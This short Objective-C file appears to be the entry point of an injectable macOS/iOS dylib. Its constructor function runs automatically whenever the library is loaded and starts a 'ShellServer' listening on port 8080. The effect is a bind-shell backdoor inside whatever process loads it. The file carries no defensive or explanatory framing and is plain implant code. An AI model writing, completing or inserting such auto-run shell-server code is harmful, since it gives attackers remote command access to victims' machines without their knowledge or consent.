// main.m - Entry point for DYLIB
#import <Foundation/Foundation.h>
#import "ShellServer.h"

__attribute__((constructor))
static void initialize(void) {
    NSLog(@"DYLIB loaded successfully at %@", [NSDate date]);
    
    // Start the shell server
    ShellServer *server = [[ShellServer alloc] init];
    [server startServerOnPort:8080];
    NSLog(@"Shell server started on port 8080");
}